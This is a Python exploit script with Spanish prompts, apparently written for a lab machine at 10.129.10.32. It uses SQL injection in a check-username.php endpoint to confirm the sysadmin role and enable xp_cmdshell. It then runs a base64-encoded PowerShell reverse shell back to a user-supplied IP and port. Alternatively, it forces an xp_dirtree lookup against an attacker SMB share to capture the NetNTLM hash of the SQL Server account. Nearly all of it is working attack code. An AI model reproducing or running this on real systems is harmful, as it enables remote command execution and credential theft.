import requests
import json
import time
import base64

entrada = input("Si desea obtener una reverse shell en el sistema destino, digite 'R'.\n\rSi desea capturar el hash NetNTLM de la cuenta utilizada para ejecutar el RDBMS en el sistema Windows destino, digite 'C'.\n\rDigite su entrada: ")
if entrada == 'R':
	respuesta = requests.get("http://10.129.10.32/api/check-username.php?u=' or (select IS_SRVROLEMEMBER('sysadmin'))=1;--")
	if (json.loads(respuesta.text)['status']) == 'taken':
		print("El usuario utilizado por la aplicacion web para conectarse al SQLServer tiene el rol 'sysadmin'. AHora, habilitaremos el procedicimiento almacenado 'xp_cmdshell' con el fin de poder ejecutar comandos en el OS del sistema destino.")
		requests.get("http://10.129.10.32/api/check-username.php?u=';EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--")
		requests.get("http://10.129.10.32/api/check-username.php?u=';EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--")
		entrada = input("'xp_cmdshell' esta habilitado. Para obtener un reverse shell en el sistema destino, debe habilitar un puerto en escucha en su sistema con Netcat. Luego, debe proporcionar la direccion IP de su sistema y el numero de puerto en escucha separados por el caracter ':': ")
		ip_port = entrada.split(':')
		time.sleep(2)
		payload = f'$client = New-Object System.Net.Sockets.TCPClient("{ip_port[0]}",{ip_port[1]});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
		payload_encode = base64.b64encode(payload.encode('utf-16le')).decode()
		requests.get(f"http://10.129.10.32/api/check-username.php?u=';exec xp_cmdshell 'powershell -exec bypass -enc {payload_encode}';--")
		print(f"El comando se ejecuto exitosamente, verifique si obtuvo su reverse shell.")
	else:
		print("No cuenta con el rol 'sysadmin' para habilitar 'xp_cmdshell'")
if entrada =='C':
	print("Debe levantar un servidor SMB en su sistema. Para ello puede utilizar este comando 'python3 smbserver.py -smb2support server .'.")
	time.sleep(2)
	entrada = input('Digite la direccion IP de su sistema y el nombre del recurso compartido en su servidor SMB, separados por una coma: ')
	ip_resource = entrada.split(',')
	respuesta = requests.get(f"http://10.129.10.32/api/check-username.php?u='; EXEC master.sys.xp_dirtree '\\\\{ip_resource[0]}\\\\{ip_resource[1]}', 1, 1;--")
	print("Observe en los registros de su servidor SMB, el hash capturado")
